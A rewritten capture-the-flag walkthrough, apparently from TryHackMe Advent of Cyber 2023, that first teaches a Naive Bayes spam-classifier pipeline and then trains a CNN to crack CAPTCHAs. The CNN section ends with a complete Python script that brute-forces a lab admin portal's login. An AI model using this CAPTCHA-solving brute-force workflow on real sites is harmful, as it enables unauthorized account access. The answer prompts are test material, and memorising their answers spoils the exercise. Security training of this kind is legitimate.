# Exploring Machine Learning Pipeline

A machine learning pipeline is the repeatable sequence of steps used to move data from its raw form into predictions or operational insights. A typical pipeline includes ingestion, cleaning, preprocessing, modeling, evaluation, and deployment.

![Exploring Machine Learning Pipeline](/assets/machine-learning-pipeline-101.png)

## Pipeline objective

- Collect data from one or more sources.
- Clean and preprocess the data so it is suitable for model training.
- Extract features from the data so machine learning algorithms can use it.
- Split the data into training and testing sets.
- Train a machine learning model.
- Evaluate model performance against unseen data.
- Use the trained model to make predictions.

## Step 0: Importing the required libraries

Before starting data collection, import the libraries used for data handling and numerical operations.

```python
import numpy as np
import pandas as pd
```

## Step 1: Data collection

Data collection gathers raw data from sources such as databases, text files, APIs, online repositories, sensors, surveys, or web scraping. In this example, the dataset is loaded from a CSV file containing email messages and their classifications.

```python
data = pd.read_csv("emails_dataset.csv")
```

### Test and check the dataset

Review the imported dataset before preprocessing. The `Classification` column contains the email label, and the `Message` column contains the email body.

```python
print(data.head())
```

Expected output:

![Test and Check Dataset](/assets/machine-learning-pipeline-102.png)

DataFrames provide a structured, tabular representation of data that is intuitive to inspect and manipulate.

```python
df = pd.DataFrame(data)
print(df)
```

Expected output:

![Test and Check Dataset](/assets/machine-learning-pipeline-103.png)

## Step 2: Data preprocessing

Data preprocessing converts raw data into a clean, organized, understandable, and structured format suitable for machine learning. This step is essential because model quality depends heavily on the relevance and quality of the input data.

### Common preprocessing techniques

| Technique | Description | Use case |
|---|---|---|
| Cleaning | Correct errors, fill missing values, smooth noise, and handle outliers. | Ensure data quality and consistency. |
| Normalization | Scale numeric data into a uniform range, typically `[0, 1]` or `[-1, 1]`. | Use when features have different scales and should contribute more equally. |
| Standardization | Rescale data to have a mean of `0` and a standard deviation of `1`. | Use when uniform feature variance is needed. |
| Feature extraction | Transform arbitrary data, such as text or images, into numerical features. | Reduce dimensionality and make patterns more apparent to learning algorithms. |
| Dimensionality reduction | Reduce the number of variables by obtaining a set of principal variables. | Reduce computational cost and improve performance by reducing noise. |
| Discretization | Transform continuous variables into discrete values. | Improve interpretability or handle continuous variables. |
| Text preprocessing | Apply tokenization, stemming, lemmatization, or similar steps. | Structure text data before feeding it into text-analysis models. |
| Imputation | Replace missing values with the mean, median, mode, or a constant. | Preserve dataset integrity when values are missing. |
| Feature engineering | Create new features or modify existing ones. | Improve predictive power by creating features that capture more useful information. |

### Utilizing `CountVectorizer()`

Machine learning models understand numbers, not raw text. `CountVectorizer`, provided by `scikit-learn`, converts text into a matrix of token counts. This prepares email message text so the classifier can learn from word frequency patterns.

```python
from sklearn.feature_extraction.text import CountVectorizer

vectorizer = CountVectorizer()
X = vectorizer.fit_transform(df['Message'])
print(X)
```

Expected output:

![Utilizing CountVectorizer](/assets/machine-learning-pipeline-104.png)

## Step 3: Train/test split dataset

A trained model must be evaluated on unseen data. Splitting the dataset allows the model to learn from one subset and be tested against another subset.

```python
from sklearn.model_selection import train_test_split

y = df['Classification']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)
```

Key variables:

- `X`: Feature matrix created by `CountVectorizer`; it contains token counts for each email message.
- `y`: Labels for each message, such as spam or ham.
- `test_size=0.2`: Reserves 20% of the dataset for testing and uses 80% for training.
- `X_train`: Feature subset used for training.
- `X_test`: Feature subset used for testing.
- `y_train`: Labels corresponding to `X_train`.
- `y_test`: Labels corresponding to `X_test`.

## Step 4: Model training

After the dataset is prepared, choose a text classification model and train it on the labeled data.

### Common text-classification models

| Model | Explanation |
|---|---|
| Naive Bayes Classifier | A probabilistic classifier based on Bayes' theorem with an assumption of independence between features. It is well suited to high-dimensional text data. |
| Support Vector Machine (SVM) | Finds an optimal hyperplane to separate classes in feature space. It works well with nonlinear and high-dimensional data when kernel functions are used. |
| Logistic Regression | Uses a logistic function to model a binary dependent variable, such as spam or ham. |
| Decision Trees | Uses a tree-like graph of decisions and outcomes. It is easy to understand but can overfit if not pruned properly. |
| Random Forest | Uses an ensemble of decision trees, typically with bagging, to improve predictive accuracy and control overfitting. |
| Gradient Boosting Machines (GBMs) | Builds strong predictive models in a stage-wise fashion and can outperform random forests when tuned correctly. |
| K-Nearest Neighbors (KNN) | Classifies each data point by majority vote among its nearest neighbors. |

### Model training using Naive Bayes

Naive Bayes uses word probabilities learned from labeled emails to determine whether a new email is more likely to be spam or ham.

The model learns patterns such as:

- Words like `free`, `win`, `offer`, and `lottery` may appear more often in spam.
- Words appearing frequently in ham reduce the probability that a new message is spam.
- A new email is classified according to which class has the higher calculated probability.

Example training code:

```python
from sklearn.naive_bayes import MultinomialNB

clf = MultinomialNB()
clf.fit(X_train, y_train)
```

Operational meaning:

- `X_train` contains the token-count features used for training.
- `y_train` contains the correct labels for each training message.
- `fit()` trains the model by calculating the probabilities and likelihoods of words appearing in each class.
- After fitting, the model can predict labels for new, unseen messages.

## Step 5: Model evaluation

After training, evaluate the model on the test set to measure predictive performance. Useful metrics include accuracy, precision, recall, and F1-score.

```python
from sklearn.metrics import classification_report

y_pred = clf.predict(X_test)
print(classification_report(y_test, y_pred))
```

Expected output:

![Model Evaluation](/assets/machine-learning-pipeline-105.png)

### Evaluation metrics

- **Precision:** Of all samples predicted as positive, the percentage that were actually positive.
- **Recall / sensitivity:** Of all actual positive samples, the percentage the model predicted correctly.
- **F1-score:** Harmonic mean of precision and recall. This is especially useful when classes are imbalanced.
- **Support:** Number of actual occurrences of each class in the dataset.
- **Accuracy:** Ratio of correctly predicted observations to total observations.
- **Macro average:** Unweighted mean per label.
- **Weighted average:** Support-weighted mean per label.

The classification report shows how the model performs for each class and overall.

## Step 6: Testing the model

Once the model performance is acceptable, use it to classify new messages.

```python
message = vectorizer.transform([
    "Today's Offer! Claim ur £150 worth of discount vouchers! Text YES to 85023 now! "
    "SavaMob, member offers mobile! T Cs 08717898035. £3.00 Sub. 16 . Unsub reply X "
])

prediction = clf.predict(message)
print("The email is :", prediction[0])
```

## What's next?

McSkidy has provided test emails in `test_emails.csv` and wants the prepared model to classify those messages.

```python
test_data = pd.read_csv("______")
print(test_data.head())
```

Expected output:

![What's Next](/assets/machine-learning-pipeline-106.png)

Expected output:

![What's Next](/assets/machine-learning-pipeline-107.png)

## Conclusion: spam detector model

From a practical perspective, model reliability requires ongoing operations after initial training:

- Continuously monitor performance on test data or in a real-world environment.
- Collect feedback from users about false positives.
- Use feedback to identify model weaknesses and improvement opportunities.
- Deploy the model into production only after evaluation supports operational use.

# Convolutional Neural Networks

Convolutional Neural Networks (CNNs) are machine learning structures that can extract features from input data and use those features to train a neural network. Instead of requiring a human to manually select the important features, a CNN learns feature extraction as part of the model.

A CNN can be divided into three main components:

- Feature extraction
- Fully connected layers
- Classification

## Feature extraction

CNNs are often used to classify images. Images are useful for explaining CNNs because they can be represented as arrays of pixel values. In this task, the CNN is used to crack CAPTCHAs.

This is the CAPTCHA being targeted:

![Feature Extraction](/assets/machine-learning-pipeline-108.png)

A single CAPTCHA character can also be treated as its own image:

![Feature Extraction](/assets/machine-learning-pipeline-109.png)

## Image representation

A computer perceives an image as an array of pixels. A pixel is the smallest measurable area in an image, and pixel values represent color or shade.

Common pixel formats:

- **RGB:** Each pixel is represented by three values from 0 to 255, describing red, green, and blue intensity.
- **Greyscale:** Each pixel is represented by a single value from 0 to 255. `0` is black, `255` is white, and values between them are shades of grey.

To represent the image as a 2D array, values are captured from the top-left pixel across each row and then downward through the image.

![Image Representation](/assets/machine-learning-pipeline-110.png)

## Convolution

Convolution is the first major step in CNN feature extraction. It reduces the size of the input while preserving important information.

Why convolution matters:

- Images can contain thousands of pixels. Feeding every pixel directly into a neural network would be slow and may not improve accuracy.
- Convolution summarizes local regions of the image using a smaller matrix called a **kernel**.
- The kernel slides across the image and creates a smaller summary image, also called a summary slice.
- Multiple kernels can be used to extract different kinds of features.
- Kernel values are usually initialized randomly and updated during training.

![Convolution](/assets/machine-learning-pipeline-111.png)

Operationally, convolution helps the network capture useful image details without requiring a direct connection to every pixel. If accuracy decreases, a smaller kernel can preserve more detail. Reusing the same kernel across the image also lets the network recognize a feature regardless of where it appears in the image.

## Pooling

Pooling further summarizes feature data using a statistical method. For example, **max pooling** selects the maximum value from each small region. **Average pooling** uses the average value instead.

![Pooling](/assets/machine-learning-pipeline-112.png)

Pooling reduces the feature size while preserving the strongest or most representative signals. After convolution and pooling, the pooled values become inputs for the neural network.

## Fully connected layers

After feature extraction, the CNN behaves like a more traditional neural network. The fully connected layers take the summary slices from the final pooling layer, pass them through hidden layers, and produce an output.

This portion is called “fully connected” because each node in one layer is connected to all nodes in the next layer.

## Classification

The classification layer produces the final prediction.

For a binary classification model, there may be only one output, such as phishing or not phishing. For CAPTCHA cracking, the model needs multiple possible outputs. A digit-only CAPTCHA requires output nodes for `0` through `9`, totaling 10 output nodes.

Important classification behavior:

- Each output node produces a decimal value between 0 and 1.
- The highest value is usually selected as the answer.
- Reviewing the top outputs can reveal confusion between similar characters.
- If the model is uncertain, an attacker or automation process can discard the CAPTCHA and request another one rather than submitting a low-confidence answer.

## Training the CNN

The task uses Attention OCR as the CNN model. This structure includes additional mechanisms, such as LSTMs and sliding windows, but the important operational point is that the sliding window allows the model to read one character at a time instead of solving the whole CAPTCHA in one step.

The CAPTCHA-cracking workflow includes:

1. Gather CAPTCHAs to create labeled data.
2. Label the CAPTCHAs for supervised learning.
3. Train the CAPTCHA-cracking CNN.
4. Verify and test the trained CNN.
5. Export and host the trained model.
6. Use a brute force script that retrieves CAPTCHAs, sends them to the model for solving, and submits login attempts.

In the training environment, the initial training and labeling steps have already been completed. The practical task focuses on hosting the model and using it.

### Start and access the AOCR Docker container

```bash
docker run -d -v /tmp/data:/tempdir/ aocr/full
```

Find the container ID:

```bash
docker ps
```

Access the container:

```bash
docker exec -it CONTAINER_ID /bin/bash
```

Move to the OCR directory:

```bash
cd /ocr/
```

## Gathering training data

Training requires a dataset of labeled CAPTCHA images. The HQ admin portal provides CAPTCHA images at:

```text
http://hqadmin.thm:8000
```

![Gathering Training Data](/assets/machine-learning-pipeline-113.png)

A raw CAPTCHA image can be retrieved from the portal using `curl`:

```bash
curl http://hqadmin.thm:8000/
```

The output includes a base64-encoded CAPTCHA image. A script can download the image, prompt for the answer, and store it as labeled training data.

View the stored raw data:

```bash
ls -alh raw_data/dataset/
```

## Creating the training dataset

AOCR requires a text file that lists each CAPTCHA path and its correct answer.

View the prepared labels:

```bash
cat labels/training.txt
```

Convert the labeled data into a TensorFlow record:

```bash
aocr dataset ./labels/training.txt ./training.tfrecords
```

The environment already contains both training and testing datasets. The training dataset trains the model, while the testing dataset checks accuracy against data the model has not seen before.

## Training and testing the CNN

Start training with:

```bash
cd labels && aocr train training.tfrecords
```

Example training output:

```text
2023-10-24 05:31:38,766 root INFO Step 1: 10.058s, loss: 0.002588, perplexity: 1.002592.
```

Training metrics:

- **Loss:** The CNN prediction error. Lower values mean smaller prediction errors. A value below approximately `0.005` can indicate that learning has completed or that the model may be overtrained.
- **Perplexity:** Model uncertainty. Values closer to `1` indicate higher confidence. A value below approximately `1.005` is considered trained or potentially overtrained.

Test the CNN with:

```bash
aocr test testing.tfrecords
```

Example testing output:

```text
2023-10-24 06:02:14,623 root INFO Step 19 (0.079s). Accuracy: 100.00%, loss: 0.000448, perplexity: 1.00045, probability: 99.73% 100% (37469)
2023-10-24 06:02:14,690 root INFO Step 20 (0.066s). Accuracy: 99.00%, loss: 0.673766, perplexity: 1.96161, probability: 97.93% 80% (78642 vs 78542)
```

Key takeaway:

- Running a trained image sample through the CNN is much faster than training the CNN.
- Prediction probability can be used operationally. If confidence is too low, the script can discard the CAPTCHA and request a new one instead of submitting a likely incorrect answer.
- Incorrectly solved CAPTCHAs can be saved, manually labeled, and used to retrain the model.

## Hosting the CNN model

The trained CNN must be hosted so the brute force script can submit CAPTCHA images for prediction. This is done with TensorFlow Serving.

Export the trained model from the AOCR container:

```bash
cd /ocr/ && cp -r model /tempdir/
```

Exit the container and stop it:

```bash
docker kill CONTAINER_ID
```

Start TensorFlow Serving:

```bash
docker run -t --rm -p 8501:8501 \
  -v /tmp/data/model/exported-model:/models/ \
  -e MODEL_NAME=ocr \
  tensorflow/serving
```

The hosted model API is available at:

```text
http://localhost:8501/v1/models/ocr/
```

## Brute forcing the admin panel

The brute force script performs an automated loop:

1. Request the HQ admin portal.
2. Extract the CAPTCHA image from the response.
3. Send the CAPTCHA to the hosted OCR model.
4. Check whether prediction confidence is high enough.
5. Submit the username, password candidate, and CAPTCHA answer.
6. Read the response and decide whether to retry, move to the next password, or stop.

### Brute force script structure

```python
import requests
import base64
import json
from bs4 import BeautifulSoup

username = "admin"
passwords = []

website_url = "http://hqadmin.thm:8000"
model_url = "http://localhost:8501/v1/models/ocr:predict"

with open("passwords.txt", "r") as wordlist:
    lines = wordlist.readlines()
    for line in lines:
        passwords.append(line.replace("\n", ""))

access_granted = False
count = 0

while access_granted == False and count < len(passwords):
    password = passwords[count]

    sess = requests.session()
    r = sess.get(website_url)

    soup = BeautifulSoup(r.content, "html.parser")
    img = soup.find("img")
    encoded_image = img["src"].split(" ")[1]

    model_data = {
        "signature_name": "serving_default",
        "inputs": {"input": {"b64": encoded_image}}
    }

    r = requests.post(model_url, json=model_data)
    prediction = r.json()
    probability = prediction["outputs"]["probability"]
    answer = prediction["outputs"]["output"]

    if probability < 0.90:
        print("[-] Prediction probability too low, not submitting CAPTCHA")
        continue

    website_data = {
        "username": username,
        "password": password,
        "captcha": answer,
        "submit": "Submit+Query"
    }

    r = sess.post(website_url, data=website_data)
    response = r.text

    if "Incorrect CAPTCHA value supplied" in response:
        print("[-] Incorrect CAPTCHA value was supplied. We will resubmit this password")
        continue
    elif "Incorrect Username or Password" in response:
        print("[-] Invalid credential pair -- Username: " + username + " Password: " + password)
        count += 1
    else:
        print("[+] Access Granted!! -- Username: " + username + " Password: " + password)
        access_granted = True
```

Run the brute force script:

```bash
cd ~/Desktop/bruteforcer && python3 bruteforce.py
```

## Conclusion: ML for red-team automation

This task demonstrates how machine learning can support red-team workflows. A custom-trained CAPTCHA solver can be integrated into automation to support a brute force workflow against a training web application.

Operational lessons:

- Generic pretrained OCR tools may work, but a model trained for a specific CAPTCHA format is likely to perform better.
- Prediction confidence can be used to reduce failed CAPTCHA submissions.
- Saved errors can be labeled and reused to improve the model.
- ML can augment custom tooling when the task requires interpretation of structured visual data.

## Answer prompts

- What key process of training a neural network is taken care of by using a CNN?
- What is the name of the process used in the CNN to extract the features?
- What is the name of the process used to reduce the features down?
- What off-the-shelf CNN did we use to train a CAPTCHA-cracking OCR model?
- What is the password that McGreedy set on the HQ Admin portal?
- What is the value of the flag that you receive when you successfully authenticate to the HQ Admin portal?

## Source

- TryHackMe Advent of Cyber 2023
